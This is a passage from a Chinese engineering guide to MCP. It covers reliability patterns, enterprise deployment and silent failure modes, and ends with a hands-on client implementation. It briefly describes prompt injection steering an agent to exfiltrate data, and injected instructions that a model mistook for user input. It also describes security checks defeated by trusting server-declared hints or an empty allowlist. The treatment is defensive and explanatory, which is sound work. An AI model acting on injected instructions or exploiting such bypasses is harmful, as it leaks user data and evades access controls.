而且这个消耗是静默的，账单上看不出「这些钱花在了重试上」。

### 9.4 熔断：三态模型

**熔断器防的是级联故障。** 当一个 Server 持续失败时，
熔断器「断开」，后续请求**直接失败不再尝试**，避免三件事：

1. 浪费时间等注定失败的请求
2. 给已经过载的 Server 加更多压力
3. **agent 陷入无限重试循环**

```
         失败率 > 阈值              冷却时间到，放行探测
  [关闭] ──────────→ [打开] ──────────────→ [半开]
    ↑                                        │
    │            探测成功                     │ 探测失败
    └────────────────────────────────────────┴──→ [打开]
```

| 状态 | 行为 | 触发条件 |
| --- | --- | --- |
| **关闭**（Closed） | 正常转发，统计失败率 | 默认 |
| **打开**（Open） | **直接返回失败，不调 Server** | 失败率超阈值（如 50%，**且最少 10 次请求**） |
| **半开**（Half-Open） | 放行少量探测请求 | 熔断持续一段时间后（如 30s） |

⚠️ **「最少 10 次请求」这个条件不能省**：
只有 2 次请求且都失败时，失败率是 100%，但**样本量根本不够**——
这时熔断会把一个偶发抖动升级成完全不可用。
**分母太小的比率没有意义**，这条在 §11 还会出现。

#### 熔断粒度：Server 级还是 Tool 级

📄 **推荐 Tool 级**：

- **Server 级**：整个 Server 不可用时，熔断所有对它的调用
- **Tool 级**：某个特定工具持续失败（如那个慢查询），
  **只熔断这个工具，Server 的其他工具照常可用**

理由很实际：一个 Server 常常暴露十几个工具，
其中一个查询超时**不代表**这个 Server 挂了。
Server 级熔断会**把一个工具的问题放大成整个 Server 不可用**。

### 9.5 健康检查：主动与被动

| | 被动（基于实际调用结果） | 主动（定期探测） |
| --- | --- | --- |
| 怎么做 | 统计每个 Server/Tool 的成功率、延迟 | 定期发轻量请求 |
| 判据 | 连续 N 次失败 → 标记不健康 | 健康时 30s 一次，不健康时 5s（快速检测恢复） |
| 优点 | **零额外开销** | 无流量时也能检测 |
| 缺点 | **需要有实际流量才能检测** | 有额外开销 |

**多层健康指标**（三层都要，缺一层就有盲区）：

| 层 | 检查什么 | 漏检什么 |
| --- | --- | --- |
| **传输层** | 进程活着吗 / 端点可达吗 | 进程活着但协议卡死 |
| **协议层** | 握手成功吗 / 心跳响应吗 | 协议正常但工具全报错 |
| **业务层** | **工具调用返回的结果合理吗** | —— |

⚠️ **业务层那条最容易被跳过，但它是唯一能抓到「绿着坏掉」的一层**：
一个 Server 进程活着、协议正常、`tools/call` 返回 200，
但**返回的内容永远是空数组**。前两层全绿，功能完全不可用。

⚠️ **与 §5 的交叉注意点**：主动健康检查传统上用 `ping`，
而 `ping` 在 `2026-07-28` 被**删除**了。新版下要改用
`server/discover`（它是必须实现的）或一次轻量业务调用。
🔬 sid-code 目前有 `HEARTBEAT_INTERVAL = 30_000`（`manager.ts:38`），
这是**基于旧版协议的实现**——迁移时是要改的点。

### 9.6 优雅降级：四级

Server 不可用时，agent **不该直接失败**。四级降级，从轻到重：

| 级别 | 做什么 | 例子 | 适用边界 |
| --- | --- | --- | --- |
| **L1 工具级** | 让 LLM 用其他工具达成同一目的 | GitHub Server 挂了 → 用 Web Search 搜 GitHub | **实现最简单**：把错误信息给模型，它通常能自己换方案 |
| **L2 缓存级** | 返回上次成功的缓存结果，**标注「数据可能不是最新」** | 查配置、查状态 | ⚠️ **只适合查询类，绝不能用于写操作** |
| **L3 功能级** | 跳过依赖该 Server 的步骤，完成其余部分 | Lint Server 挂了 → 跳过 lint，只做逻辑审查 | **必须告诉用户哪些步骤被跳过了** |
| **L4 人工转接** | 转人工，**保留完整上下文和已完成步骤** | 全自动手段都失败 | 减少人工接手成本 |

🔑 **L1 那条揭示了 agent 系统的一个独特性质**：
传统系统的降级要**代码里写死**（if 主服务挂了 then 调备用服务）；
agent 的降级可以**由模型自己完成**——你只需要把错误信息如实告诉它。

**这再次指回 §3.4**：`result.isError` + 清晰的错误文本
**就是 agent 的降级机制**。所以「错误信息写得清不清楚」
不是日志质量问题，**是可靠性设计的一部分**。

### 9.7 生产架构：为什么 Gateway 会成为标配

大规模部署时，在 agent 和 Server 之间加一层 **MCP Gateway**：

```
Agent ──→ MCP Gateway ──┬──→ MCP Server A
                        ├──→ MCP Server B
                        └──→ MCP Server C
```

Gateway 统一处理**所有横切关注点**：

| 关注点 | 为什么必须集中 |
| --- | --- |
| 负载均衡 | 同一 Server 的多实例分发 |
| **熔断 / 限流** | 状态必须集中，否则每个 Client 各自统计，阈值形同虚设 |
| 健康检查 | 一处探测，所有 Client 共享结果 |
| **认证代理** | 集中管 OAuth Token，避免每个 Client 各自处理 |
| 审计 / 可观测 | **唯一的拦截点** |

**为什么 Gateway 是必然的**（这个论证值得记住）：

> MCP 把分布式系统的全部横切关注点（认证、审计、熔断、限流、DLP）
> 带进了 agent 架构，而**这些关注点不可能在每个 Client 或 Server 里重复实现**。
> Gateway 是唯一的集中控制点——**和微服务架构里 API Gateway 的角色完全一致**。

📄 **MCP Gateway ≠ API Gateway**（这是个高频易混点）：
功能类似，但 MCP Gateway 还要处理 MCP 特有的东西——
**工具路由（语义匹配，见 §6.3）、工具描述缓存、
MCP 会话管理、Tool 级熔断**。

🌐 **一个和 §5 的漂亮呼应**：`2026-07-28` 的无状态化
**大幅降低了 Gateway 的实现难度**——不用再维护会话亲和，
新增的 `Mcp-Method` / `Mcp-Name` 请求头让 Gateway
**不解析 body 就能路由**。
**协议的演进方向就是在为 Gateway 模式让路。**

### 9.8 本章自检

1. 为什么 MCP 协议不内置重试和熔断？用 HTTP 类比说明。
2. 「内层超时 < 外层超时」违反了会怎样？为什么修内层 bug 会没有效果？
3. 重试的 `jitter` 防的是什么真实事故？
4. 框架层重试和 LLM 层重试各适合什么故障？它们和 §3.4 的错误分类什么关系？
5. 熔断的「最少 10 次请求」条件为什么不能省？
6. 三层健康检查里，哪一层能抓到「进程活着但功能全废」？
7. 为什么说「错误信息写得清不清楚」属于可靠性设计？

---
<a id="c10"></a>
## §10 企业落地：开放性撞上封闭性

### 10.1 核心矛盾

MCP 设计之初面向的是**开发者个人场景**（Claude Desktop 连本地工具）。
企业环境的约束**几乎每一条都相反**：

| MCP 的设计假设 | 企业的现实 |
| --- | --- |
| 连接一切 | 网络分区隔离 |
| 即插即用 | 所有软件必须审批 |
| 用户自己配 Server | IT 统一管控 |
| 数据随便流动 | 数据不出域、合规审计 |
| 信任本地安装的代码 | 零信任 |

> ⚖️ **把一个「连接一切」的协议部署到「隔离一切」的内网，
> 这就是 MCP 企业化的全部难度。**

📄 而这个矛盾之所以尖锐，是因为**企业同时是最需要 MCP 和最需要控制的那一方**：
企业有几十上百个内部系统（最需要连接），同时有最严的合规要求（最需要控制）。

📄 一组说明规模的数字（2026 上半年，引用带出处）：
**28% 的 Fortune 500 已在生产部署 MCP Server（Fintech 领域 45%）**，
同时 **MCP 已被称为「新的 Shadow IT」——安全团队对 AI Agent
连接企业系统的可见性接近零**。

**这两个数字放在一起才是完整图景**：采用速度远快于治理能力。

### 10.2 挑战一：网络隔离与代理穿透

企业内网通常是多层分区：

```
互联网 ←→ DMZ ←→ 办公网 ←→ 生产网 ←→ 数据网
         防火墙   防火墙    防火墙    防火墙
```

两种传输在企业网络里各有各的麻烦：

**stdio（本地 Server）**：不涉及网络穿透，但
⚠️ **企业通常限制用户安装和运行未审批的可执行文件**。
`npx -y @some/mcp-server` 这行配置在企业机器上可能压根跑不起来
——它要从公网拉包、要执行未签名代码。
📄 解法是通过企业软件分发平台（SCCM、Intune）统一部署审批过的 Server。

**Streamable HTTP（远程 Server）**：
- Server 在内网，Client 在办公网 → 要穿防火墙
- ⚠️ Client 在**云端**（如 claude.ai）→ **要从外网访问内网，
  这直接违反企业安全策略**。这一条常常是整个方案的否决点。

**四种穿透方案**：

| 方案 | 原理 | 优势 | 劣势 |
| --- | --- | --- | --- |
| **反向代理 / API Gateway** | Nginx/Kong 把内网 Server 暴露到 DMZ | 成熟，安全团队熟悉 | 要开端口，增加攻击面 |
| **MCP Gateway** | 专用 MCP 代理，统一认证和路由 | **MCP 原生，可做细粒度控制** | 新技术，成熟度待验证 |
| **VPN / 零信任网络** | ZTNA（如 Cloudflare Access）建隧道 | 不用开额外端口 | 增加延迟，配置复杂 |
| **服务网格** | Istio/Linkerd 强制 mTLS | K8s 环境原生 | **仅限 K8s** |

📄 推荐架构：**在 DMZ 部署 MCP Gateway，作为内外网唯一入口**。

### 10.3 挑战二：认证与企业身份集成

企业有自己的身份体系（AD、Okta、Azure AD），MCP 的 OAuth 要和它对接。

**三条核心需求**：

1. **MCP 访问绑定企业 SSO** —— **员工离职自动撤销所有 MCP 权限**
2. **AI Agent 用「服务账号」/「Bot 身份」**，权限严格限定
3. **Token 生命周期短**（企业通常要求 < 1 小时），支持自动刷新

```
用户 → 企业 SSO（Okta/Azure AD）→ 获取 JWT
                                      ↓
MCP Client 带 JWT → MCP Gateway → 验签 + 校 scope → 转发到内网 Server
```

关键点：
- MCP Server 作为 **OAuth Resource Server**，验 JWT 签名和 scope
- 用 **RFC 8707 Resource Indicator** 确保 Token 只能用于特定 Server
- **企业 IdP 的用户组/角色映射到 MCP 工具权限**（如「财务组」只能用财务工具）

⚠️ 第 1 条是企业最看重的，也最容易被低估：
**「离职后权限自动失效」不是锦上添花，它是审计的硬要求。**
如果 MCP Server 用的是静态 API Key，
**员工离职后那把 Key 依然有效**——📄 而实测
**88% 的 MCP Server 需要凭证，其中 53% 仍依赖静态 API Key**。
这在 SOC 2 审计中是**重大缺陷**。

🌐 与 §8.8 呼应：`2026-07-28` 把动态客户端注册废弃、
改推 Client ID Metadata Documents，并新增了两个官方授权扩展
（**OAuth Client Credentials** 做机器对机器认证、
**Enterprise-Managed Authorization** 走组织 IdP 集中管控，首个支持 Okta）。
**协议正在主动往企业需求上靠。**

### 10.4 挑战三：证书管理

企业内网通常用**私有 CA**，不信任公共 CA。于是：

```
内网 MCP Server 用企业 CA 签的证书
       ↓
MCP Client 默认只信任公共 CA
       ↓
TLS 握手失败，连接被拒
```

**四条解法**：

- 把企业 CA 根证书加到 Client 信任链
- **用 mTLS（双向 TLS）**：不只 Server 证明身份，Client 也要证明
- **证书自动轮换**：cert-manager（K8s）或 Vault PKI 管生命周期
- ⚠️ **不要在配置文件里硬编码证书路径**——用环境变量或密钥管理服务

**mTLS 在 MCP 里的价值**：传统 TLS 只验 Server 身份；
mTLS 双向验证，**确保只有持有效客户端证书的 MCP Client 才能连**。
这正好匹配零信任的「永不信任，始终验证」。

### 10.5 挑战四：审计日志与合规

企业级 AI 系统必须能回答：**「谁在什么时候用 AI 做了什么」**。
MCP 协议不定义审计机制，**要在基础设施层实现**。

**审计日志要记六个维度**：

| 维度 | 记什么 | 用途 |
| --- | --- | --- |
| **身份** | 用户 ID、角色、部门、IP | 责任追溯 |
| **操作** | 工具名、参数、返回结果 | 行为审计 |
| **时间** | 精确到毫秒的时间戳 | 事件重建 |
| **上下文** | 会话 ID、任务 ID、关联的 LLM 请求 | **因果链分析** |
| **决策** | **模型为什么选这个工具**（推理过程） | 可解释性 |
| **结果** | 成功/失败、错误信息、副作用 | 影响评估 |

⚠️ **「决策」那一维是 agent 特有的，也是最难做的**：
传统审计只需记「谁做了什么」，agent 审计还要回答
**「为什么 AI 决定做这件事」**——否则事故复盘时你只知道
「agent 删了那个文件」，不知道它为什么认为该删。

**审计架构**：

```
MCP Client → MCP Gateway（★ 审计拦截点）→ MCP Server
                  ↓
            审计日志收集器 → SIEM → 告警 / 报表 / 合规报告
```

📄 **Gateway 是最佳拦截点**——所有流量都经过它，
可以统一记录而**不需要改每个 Server**。

**三个合规框架的具体约束**：

| 框架 | 要求 | MCP 的差距 |
| --- | --- | --- |
| **SOC 2** | 证明访问控制、变更管理、审计追踪有效 | 53% 用静态 API Key → **重大缺陷** |
| **GDPR** | 数据处理合法性、最小化、用户删除权 | 数据经 MCP 流动时要能追踪和删除 |
| **等保 / 数据安全法** | **数据不出境** | Server 必须部署在境内 |

### 10.6 挑战五：数据防泄漏（DLP）

MCP 让 AI 能访问企业内部数据（数据库、文档、代码仓库），
**泄露风险显著上升**。

**三个风险场景**：

1. LLM 把内部数据作为上下文**发到云端 API**（数据出域）
2. Server 返回的敏感数据被 LLM 记住，**在其他会话中泄露**
3. **恶意提示注入诱导 agent 把敏感数据发到外部**

**四条防护**：

| 措施 | 做什么 |
| --- | --- |
| **数据分级** | 对 Server 返回的数据做敏感度分级，**高敏感不许发云端 LLM** |
| **出口过滤** | Gateway 检查出站数据，拦截身份证号、银行卡号等 |
| **本地模型** | 高敏感场景用本地部署的模型，**数据不出内网** |
| **网络外联控制** | 限制 Server 的**出站**网络访问，防侧信道泄露 |

⚠️ 第 4 条最容易漏：你管住了 Client → Server 的入站流量，
但**一个恶意 Server 自己可以往外发请求**。
Server 跑在你的内网里、拿着你的数据、能访问公网 —— 这是个完整的外泄通道。

### 10.7 企业级参考架构

```
                        ┌─────────────────────────┐
                        │    企业 IdP（Okta）      │
                        └────────────┬────────────┘
                                     │ OAuth 2.1 / OIDC
┌──────────┐    TLS     ┌───────────┴───────────┐   mTLS    ┌──────────────┐
│  AI 应用  │ ────────→ │   MCP Gateway（DMZ）   │ ───────→ │ MCP Server A │
│ （办公网） │           │  - 认证 / 授权          │          │  （生产网）    │
└──────────┘           │  - 审计日志            │          └──────────────┘
                        │  - DLP 过滤            │   mTLS    ┌──────────────┐
                        │  - 限流 / 熔断          │ ───────→ │ MCP Server B │
                        │  - 工具路由（语义）      │          │  （数据网）    │
                        └───────────┬───────────┘          └──────────────┘
                                     │
                              ┌──────┴──────┐
                              │  SIEM / 审计 │
                              └─────────────┘
```

**这张图的核心思想只有一条**：
**把所有横切关注点收敛到一个点（Gateway），
让 Server 只管业务、Client 只管协议。**

### 10.8 ⚖️ 一条核心 trade-off：开放生态 vs 安全控制

| | 开放发现 | 严格控制 |
| --- | --- | --- |
| 买到什么 | 生态快速增长、即插即用 | 攻击面可控 |
| 代价 | **攻击面不可控** | 生态价值打折、迭代变慢 |
| 适合 | 开发环境、内部可信环境、个人 | 生产（版本锁定 + 代码签名）、企业（安全审查才能注册） |

**判据是环境的信任级别**，不是「哪个更好」。

📄 而那个 **82% 路径遍历**的数字要这样读：
**它不是「实现质量差」，是「开放连接」这个设计目标的结构性代价。**

> **你不可能同时拥有「任何人都能写 MCP Server」和「所有 MCP Server 都安全」。**

🎤 **面试话术**：「MCP 的开放性是双刃剑——生态增长快但攻击面不可控。
82% 的 Server 有路径遍历漏洞，这不是实现质量问题，
是开放生态的结构性代价：你不可能同时要『谁都能写 Server』和『所有 Server 都安全』。
我的做法是按环境信任级别分开：开发环境开放发现快速试用，
生产环境通过 Gateway 集中管控，所有 Server 必须过安全审查和版本锁定才能注册。」

### 10.9 企业部署的完整决策树

```
要不要用 MCP？
  ├→ 先问：需要跨应用 / 跨模型复用工具吗？
  │   ├→ 否 → Function Calling 就够，MCP 是过度工程
  │   └→ 是 → 用 MCP，再问：工具有多少个？
  │       ├→ < 15  → 直接全量注入
  │       ├→ 15-50 → 考虑按需加载
  │       └→ > 50  → 必须做 Tool Search / 语义路由（§6.3）
  │
  └→ 部署在哪？
      ├→ 本地单用户 → stdio，零配置
      │   └→ ⚠️ 除非合规要求可审计 → 那也得走远程
      └→ 远程 / 多用户 → Streamable HTTP，再问：企业环境？
          ├→ 否 → 基础 OAuth 2.1 + TLS
          └→ 是 → MCP Gateway + SSO 集成 + 审计日志 + DLP + mTLS

无论哪条路，三条底线：
  - 工具描述质量直接决定选择准确率（§6.4）
  - 每个 Server 都是攻击面 → 版本锁定 + 安全审查
  - LLM 生成的参数 = 不可信输入（§8.3）
```

### 10.10 本章自检

1. MCP 的设计假设和企业约束，各举两条相反的。
2. Client 在云端、Server 在内网，为什么这个组合常常是方案否决点？
3. 「员工离职自动撤销权限」为什么和静态 API Key 冲突？
4. agent 审计比传统审计多了哪一个维度？为什么它最难做？
5. 你已经管住了入站流量，为什么还要限制 Server 的**出站**网络访问？
6. 「82% 的 Server 有漏洞」该怎么读？它说明实现质量差吗？

---
<a id="c11"></a>
## §11 ★ 会静默坏掉的失效模式（本文最重要的一章）

### 11.0 这一章的共同结构

前面十章讲「怎么做对」。这一章讲**做错了但看不出来**的情况。

**先把这些失效模式的共同点点破**——这是全章唯一需要记住的东西：

> 🔴 **它们全都不报错。**
> 代码在、连接绿、工具列表拿到了、日志没有 ERROR、测试全绿，
> **而结论是错的**。

**为什么这一章最值钱**：报错的 bug 会自己找上你，
静默失效的 bug 要**你主动去找**——而你不知道要找什么，
就永远找不到。下面十二条，每条给「现象 / 根因 / 判据」。

### 11.1 🔴 R1：stdout 污染 —— 一行日志毁掉整个连接

**现象**：Server 明明写好了，Client 连上就报「JSON 解析失败」或直接卡住。

**根因**：Server 代码里有一行 `console.log('starting...')`。
stdio 传输下 **stdout 是协议通道**，那行日志变成了一条非法协议消息。

⚠️ **为什么它特别阴**：
- 很多语言的日志库**默认输出到 stdout**
- 一个依赖库在初始化时打了一行 banner，**不是你写的代码**
- 开发时你用 `node server.js` 手测，**看起来完全正常**（你就是在看 stdout）

**判据**：

```bash
# 直接跑 Server，把 stdout 和 stderr 分开看
node your-server.mjs 2>/dev/null | head -5
# 正常：一行都没有（等待输入）或只有合法 JSON
# 有病：出现任何非 JSON 文本 → 就是它
```

**修法**：所有日志走 stderr。§0.2 那三十行代码第一行就是
`const log = (...a) => console.error(...)`，就是为这个。

### 11.2 🔴 R2：工具零调用 —— 连接是绿的，但模型从来不用

**现象**：Server 连接状态 `connected`，`tools/list` 返回了 20 个工具，
**模型一次都没调用过**。

⚠️ **这一条最容易被误判**，因为**每一层看起来都是好的**：
连接绿、工具数不为零、没有任何报错。

**它有五个完全不同的成因**，必须逐个排除（这是本节的核心价值）：

| # | 成因 | 判据 |
| --- | --- | --- |
| 1 | **描述太差**，模型不知道何时该用（§6.4） | 人读一遍描述：能否判断什么时候用它？ |
| 2 | **工具太多**，被淹没在上百个里（§6.1） | 工具总数 > 50？ |
| 3 | **名字被截断**（超 64 字符）导致模型引用不到 | 检查全限定名长度 |
| 4 | **工具压根没进请求体**（接入层 bug） | **抓一次真实请求，grep 工具名** |
| 5 | **权限层静默拦截**了调用 | 查权限决策日志 |

**必须先分清 4 和 1-3**，因为它们的修法完全不同
（一个改代码，一个改文案），而**表象一模一样**。

**唯一可靠的判据**：

```bash
# 抓一次真实的模型请求体，看工具到底在不在里面
grep -o '"name":"mcp__[^"]*"' 请求体.json | sort -u
# 工具名不在 → 成因 4，接入层的 bug，改代码
# 工具名在，但模型不调 → 成因 1/2/3，改描述或做 Tool Search
```

> 🔑 **通用手法：区分「没送进去」和「送进去了但没被用」。
> 这两件事的表象相同，根因和修法完全不同。**
> 这个手法在 agent 排查里到处适用。

### 11.3 🔴 R3：分母太小的比率 —— 熔断把抖动升级成故障

**现象**：一个健康的 Server 被熔断了。

**根因**：熔断只看失败率，不看样本量。请求 2 次、失败 2 次 → 失败率 100% → 熔断。
但**两次失败可能只是一次网络抖动**。

**判据**：检查熔断条件里有没有「最少 N 次请求」这一项（§9.4）。

> 🔑 **通用原则：分母比分子重要。**
> 任何比率型指标（失败率、命中率、准确率）都必须同时写死
> **分母口径**和**最小样本量**。§6.8 那条也是同一件事。

### 11.4 🟠 R4：多层超时互相掩蔽 —— 修了一层只是换了个杀手

**现象**：你把工具超时从 10s 调到 60s，**行为完全没变**，还是 30s 就失败。

**根因**：外层有个 30s 的超时。**内层的设置是死代码。**

⚠️ **它的危险在于会误导排查方向**：你以为是工具慢，
实际是**你改的那个参数从来没生效过**。可以在错误的方向上耗掉一整天。

**判据**：

```
把每一层的超时值列出来，从外到内必须严格递减。
任何一层 >= 外层 → 那一层永远不会触发。
```

**修法**：不只是改值，要**在代码里断言这个约束**
（启动时校验 `innerTimeout < outerTimeout`，不满足就报错）。
**能被静默违反的约束，一定会被违反。**

### 11.5 🟠 R5：工具顺序不稳定 —— cache 命中率悄悄归零

**现象**：成本比预期高很多，但每一项看起来都正常。

**根因**：工具定义在请求体里的顺序每次不同 → prompt cache 前缀不匹配 → 全部重新计费（§6.5）。

⚠️ **最常见的来源是「多 Server 并发返回后按完成顺序拼接」**——
顺序取决于**哪个 Server 先响应**，每次都可能不同。
**它不报错，只是钱变多了。**

**判据**：

```bash
# 连续两轮请求，对比工具名的出现顺序
grep -o '"name":"mcp__[^"]*"' 请求1.json > /tmp/o1
grep -o '"name":"mcp__[^"]*"' 请求2.json > /tmp/o2
diff /tmp/o1 /tmp/o2 && echo "顺序稳定 ✅" || echo "顺序不稳定 ❌ 正在烧钱"
```

⚠️ **注意这里不能 `sort`**——一旦排序，你就把「顺序不同」这个信息
自己抹掉了，然后得出「一样的」这个假结论。
**排查顺序问题时，任何排序动作都是在销毁证据。**

### 11.6 🟠 R6：协议错误 vs 业务错误搞混 —— agent 原地空转

**现象**：agent 反复调同一个工具、同样的参数，一直失败，不换方案。

**根因**：把业务错误（「文件不存在」）返回成了协议 `error`。
**模型看不到原因**，所以无法自我纠正（§3.4、§9.3）。

**判据**：让一个工具故意失败，然后检查**模型的对话历史里有没有那条错误文本**。
看不到 → 就是它。

**这条的教学价值**：它说明**「错误信息给谁看」是个架构决策**，
不是日志细节。给程序看的走 `error`，给模型看的走 `result.isError`。

### 11.7 🟠 R7：annotations 被当成安全保证

**现象**：安全审计发现一个破坏性工具被自动放行了。

**根因**：代码用 `readOnlyHint === true` 作为**唯一**放行依据，
而这个值**由 Server 自己声明**（§2.2、§7.7）。

**判据**：搜代码里所有用到 `readOnlyHint` / `destructiveHint` 的地方，
问一句：**如果 Server 在这里说谎，会发生什么？**
如果答案是「会绕过安全检查」→ 这里有漏洞。

> 🔑 **通用原则：任何来自信任边界之外的声明都是「提示」不是「保证」。**
> 名字里带 `Hint` 的字段，规范作者已经在提醒你了。

### 11.8 🟠 R8：空数组和 undefined 语义混淆 —— 安全策略反向失效

**现象**：配置了 `allowedServers: []`（本意是全部禁止），
**实际所有 Server 都能连**。

**根因**：代码写成 `if (policy.allowedServers?.length) { 检查 }`，
空数组走 else 被放行（§8.4）。

⚠️ **这是本章最危险的一条**，因为它的失效方向是
**「本意是最严格，实际是最宽松」**——**完全反向**。

**判据**：所有「列表型配置」都要显式测三种情况：

```
undefined  → 应该是什么行为？
[]         → 应该是什么行为？（★ 最容易错的一格）
[非空]     → 应该是什么行为？
```

**并且这三种必须各有一个测试用例。** 只测非空那格是最常见的疏漏。

### 11.9 🟠 R9：注入文本的「形态」让模型认错说话人

**现象**：agent 第一轮做了件莫名其妙的事（比如去 glob 记忆文件）。

**根因**：注入的 MCP instructions 用了 `# 标题` 开头，
**形态和用户输入无法区分**，模型分不清谁在说话（§7.9 那个真实事故）。

**判据**：把你注入的文本和用户的真实输入并排放，问：
**如果我是模型，我能区分这两段是谁说的吗？**
区分依据只能是**文本内容本身**（因为 block 边界在 wire 上会丢）。

**修法**：`<system-reminder>` 围栏 + 显式声明「非用户输入」+ 不要用浅层标题。

> 🔑 **通用原则：注入内容有「语义」和「形态」两个维度，
> 模型会用形态判断来源。** 这条在所有 context 注入场景都适用。

### 11.10 🟡 R10：「接了但没人用」—— 功能自己变成死代码

**现象**：一个函数有代码、有测试、测试全绿，**但没有任何生产调用点**。

🔬 **本文有个现成的正面样本**：sid-code 的
`buildMcpInstructionsSection` 在注释里明写
「**当前无生产调用点**，仅测试驱动」并标 `@deprecated`（§7.9）。

⚠️ **为什么它危险**：在任何盘点、任何「我们有没有实现 X」的问题里，
**它都会被算成资产**。于是你以为有这个能力，实际没有在跑。

**判据**（这个判据的选法本身值得学）：

```bash
# ❌ 错的判据：搜函数名有没有出现
grep -rn "buildMcpInstructionsSection" packages/
#    为什么错：测试文件里的调用会让它看起来「有人用」

# ✅ 对的判据：排除测试文件后再搜
grep -rn "buildMcpInstructionsSection" packages/ --include='*.ts' | grep -v '\.test\.ts'
#    零命中 → 确认是死代码
```

> 🔑 **通用手法：「存在」不等于「在运行」。**
> 盘点能力时，判据必须排除测试和自引用，否则会系统性高估。

### 11.11 🟡 R11：引用旧文档的「现状」—— 本文的活体教训

**现象**：你按一份高质量文档实现了协议握手，
**实现完发现规范里已经没有这个东西了**。

**根因**：文档写作时是对的，四个月后过期了（§1.1 那五条）。

⚠️ **这是本文自己撞到的**：三份源材料教的
`initialize` 握手、`Mcp-Session-Id`、`ping`、`Last-Event-ID`
**全部已被官方删除**。照抄就会实现一个不存在的协议。

**判据**：§1.3 那五个探针。并且记住它是**单向**的
——有命中一定旧，零命中不能证明新。

> 🔑 **通用纪律：凡引用「现状」，先复跑 / 先核验。**
> 这条纪律的成本是几分钟，不遵守的成本是几天。

### 11.12 🟡 R12：健康检查漏掉业务层 —— 绿着坏掉

**现象**：监控全绿，用户报告工具不工作。

**根因**：只做了传输层（进程活着）和协议层（握手成功）检查，
**没做业务层**（返回的结果是否合理）。
一个永远返回空数组的 Server，前两层全绿（§9.5）。

**判据**：对每个关键工具，问一句：
**如果它开始永远返回空结果，我的监控会报警吗？**
不会 → 你缺业务层检查。

### 11.13 一个统一的心智模型

十二条失效模式，其实是**同一件事的十二个面**：

> 🔴 **每一条都是「一个本该失败的东西，成功了」。**
>
> - 日志成功写进了 stdout（本该只进 stderr）
> - 工具成功没被调用（本该被调用，且本该报错）
> - 熔断成功触发了（本该因样本不足而不触发）
> - 内层超时成功没生效（本该生效）
> - 空 allowlist 成功放行了（本该全拒）
> - 死代码成功通过了盘点（本该被发现）
>
> **它们之所以静默，是因为「成功」这条路径上没有人设检查点。**

**所以排查静默失效的通用手法只有一条**：

> 🔑 **不要问「有没有报错」，要问「如果这里坏了，我会知道吗」。**
> 答案是「不会」的每一处，都是一个潜在的静默失效点。

### 11.14 本章自检

1. 这十二条失效模式的共同点是什么？为什么它们比会报错的 bug 更贵？
2. 「工具零调用」有五个成因。哪一个必须先排除？用什么命令？
3. 排查「工具顺序不稳定」时，为什么绝对不能 `sort`？
4. `allowedServers: []` 那条的失效方向为什么特别危险？
5. 判断一个函数是不是死代码，判据要怎么写才不会自欺？
6. 用一句话说出排查静默失效的通用手法。

---
<a id="c12"></a>
## §13 动手：五阶段实现路线

### 13.0 为什么要按这个顺序

**每个阶段都要让你亲手撞到下一个阶段要解决的问题。**
如果一开始就照着完整架构写，你会不理解那些抽象为什么存在。

| 阶段 | 做什么 | 时间 | 你会撞到什么 |
| --- | --- | --- | --- |
| 1 | 手搓一个 Server + 一个 Client | 半天 | stdout 污染、消息分帧 |
| 2 | 接第二个 Server，被迫做抽象 | 一天 | 撞名、并发、状态机 |
| 3 | 接一个远程 Server | 一天 | 认证、超时、重连差异 |
| 4 | 工具多了，做 Token 治理 | 一到两天 | cache 击穿、顺序不稳定 |
| 5 | 加安全门控与可观测 | 一天 | 空值语义、静默失效 |

---

### 阶段 1：手搓一个 Server + 一个 Client（半天）

**目标**：不装任何 SDK，把 §0.2 那个 Server 跑通，再自己写 Client 连上它。

Server 直接用 §0.2 的代码。Client 这样写：

```javascript
// mini-client.mjs —— 最小 MCP Client（stdio）
import { spawn } from 'node:child_process';
import { createInterface } from 'node:readline';

const server = spawn('node', ['weather-server.mjs'], {
  stdio: ['pipe', 'pipe', 'inherit'],   // stderr 直通终端，方便看 Server 日志
});

let nextId = 1;
const pending = new Map();

createInterface({ input: server.stdout }).on('line', line => {
  if (!line.trim()) return;
  const msg = JSON.parse(line);
  if (msg.id !== undefined && pending.has(msg.id)) {
    pending.get(msg.id)(msg);
    pending.delete(msg.id);
  } else {
    console.log('[通知]', msg.method);   // 没有 id → 是通知
  }
});

function request(method, params) {
  const id = nextId++;
  return new Promise(resolve => {
    pending.set(id, resolve);
    server.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
  });
}

// 走一遍完整流程
const init = await request('initialize', {
  protocolVersion: '2025-03-26',
  capabilities: {},
  clientInfo: { name: 'mini-client', version: '0.1.0' },
});
console.log('Server 能力:', init.result.capabilities);

const list = await request('tools/list');
console.log('工具:', list.result.tools.map(t => t.name));

const call = await request('tools/call', {
  name: 'get_weather',
  arguments: { city: 'Nanjing' },
});
console.log('结果:', call.result.content[0].text);

server.kill();
```

**这一阶段必须亲手做的两个实验**：

1. **故意在 Server 里写一行 `console.log('hello')`**，看 Client 怎么崩。
   这是 §11.1 那条 P0 坑，**撞过一次就再也不会忘**。
2. **故意不加 `\n`**（用 `process.stdout.write(JSON.stringify(msg))`），
   看消息怎么粘在一起。这让你理解**分帧**为什么重要。

---

### 阶段 2：接第二个 Server，被迫做抽象（一天）

**目标**：再写一个 Server（比如 `note-server.mjs`，也提供一个叫 `search` 的工具），
然后同时连两个。

**你会立刻撞到三个问题，这正是重点**：

1. **撞名**：两个 Server 都有 `search`。
   → 实现 §7.6 的 `buildMcpToolName` / `parseMcpToolName`。
   ⚠️ **顺手测一下 Server 名叫 `my_ server` 的情况**，
   你会亲眼看到解析错在哪。
2. **状态管理**：一个 Server 启动失败了，另一个正常。
   代码里到处是 `if (server.client)` → **说明你需要状态机**（§7.4）。
3. **并发**：两个还好，把它复制成 12 个 Server 试试，
   观察机器负载 → **说明你需要并发上限**（§7.5，本地 3）。

**这一阶段的产出**：一个 `MCPManager` 类，管理 N 个连接的生命周期。

---

### 阶段 3：接一个远程 Server（一天）

**目标**：用 Streamable HTTP 连一个远程 Server（可以自己用
Express/Hono 写一个最简版：**只处理 POST、返回 JSON**，见 §4.2 的「最简档」）。

**这一阶段要建立的三个认知**：

1. **传输层是可替换的**：你的 `MCPManager` 应该只依赖
   「能发消息、能收消息」这个接口，不关心底下是 stdio 还是 HTTP。
   **如果改传输要动 Manager 的代码，说明抽象没做对。**
2. **重连策略必须差异化**（§7.10）：
   本地进程崩了 → **不自动重连**（大概率是配置错）；
   远程网络断了 → **指数退避重连**。
